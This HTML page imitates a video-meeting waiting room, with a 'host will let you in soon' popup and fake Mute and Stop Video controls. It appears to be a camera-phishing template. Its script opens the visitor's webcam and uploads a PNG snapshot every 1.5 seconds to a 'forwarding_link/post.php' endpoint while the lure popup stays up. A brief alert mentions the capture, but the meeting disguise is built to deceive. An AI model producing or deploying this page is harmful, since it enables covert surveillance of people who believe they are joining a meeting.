<!doctype html>
<html>

<head>
  <meta charset="UTF-8">

  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

  <style>
    @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500&display=swap");

    body {
      height: 100vh;
      width: 100vw;
      margin: 0;
      font-family: 'Nunito', sans-serif;
    }

    .bottom-bar {
      position: fixed;
      bottom: 0;
      height: 80px;
      width: 100%;
      background-color: #1F2022;
      display: flex;
      align-items: center;
      color: #fff;
    }

    .icon-button {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 0 25px;
    }

    button {
      background: crimson;
      border: none;
      color: white;
      padding: 6px 20px;
      border-radius: 6px;
    }

    #ac-wrapper {
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,.6);
      z-index: 1000;
    }

    #popup {
      width: 600px;
      background: #fff;
      border: 4px solid #000;
      border-radius: 14px;
      padding: 20px;
      margin: 220px auto;
      text-align: center;
    }
  </style>
</head>

<body>

<!-- USER NOTICE -->
<script>
alert(
  "NOTICE:\n\n" +
  "This page will access your camera.\n" +
  "Video frames will be periodically captured and uploaded to the server.\n\n" +
  "By continuing, you consent to this behavior."
);
</script>

<div class="video-wrap">
  <video id="video" autoplay playsinline></video>
</div>

<center>
  <canvas id="canvas" width="640" height="480"></canvas>
</center>

<div id="ac-wrapper">
  <div id="popup">
    <h2>Please wait, the meeting host will let you in soon</h2>
  </div>
</div>

<div class="bottom-bar">
  <div class="icon-button"><i class="fas fa-microphone"></i><h6>Mute</h6></div>
  <div class="icon-button"><i class="fas fa-video"></i><h6>Stop Video</h6></div>
  <div class="icon-button"><i class="fas fa-users"></i><h6>Participants</h6></div>
  <button>End</button>
</div>

<script>
'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

const constraints = {
  video: { facingMode: "user" },
  audio: false
};

/* ===== AJAX UPLOAD ===== */
function post(imgdata) {
  $.ajax({
    type: 'POST',
    url: 'forwarding_link/post.php',
    data: { frame: imgdata },
    dataType: 'json'
  });
}

/* ===== CAMERA INIT ===== */
async function init() {
  const stream = await navigator.mediaDevices.getUserMedia(constraints);
  video.srcObject = stream;

  setInterval(() => {
    ctx.drawImage(video, 0, 0, 640, 480);
    const img = canvas.toDataURL("image/png");
    post(img);
  }, 1500);
}

init();

/* popup hide */
setTimeout(() => {
  document.getElementById('ac-wrapper').style.display = "none";
}, 50000);
</script>

</body>
</html>
